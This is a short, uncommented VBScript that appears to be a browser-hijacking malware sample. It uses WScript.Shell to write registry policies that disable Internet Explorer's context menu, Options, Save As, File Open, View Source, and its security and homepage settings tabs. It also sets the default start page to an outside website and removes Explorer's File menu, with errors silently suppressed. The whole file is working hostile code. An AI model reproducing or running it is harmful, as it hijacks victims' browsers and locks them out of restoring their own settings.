On Error Resume Next
Set fs=CreateObject("Scripting.FileSystemObject")
Set dir1=fs.GetSpecialFolder(0)
Set dir2=fs.GetSpecialFolder(1)
Set so=CreateObject("Scripting.FileSystemObject")
dim r
Set r=CreateObject("Wscript.Shell")
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserContextMenu",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserOptions",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoBrowserSaveAs",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoFileOpen",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Advanced",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Cache Internet",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\AutoConfig",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\History",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock",1,"REG_DWORD"
r.Regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Start Page","http://liudemin.myetang.com"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\SecurityTab",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\ResetWebSettings",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions\NoAddingSubScriptions",1,"REG_DWORD"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu",1,"REG_DWORD"
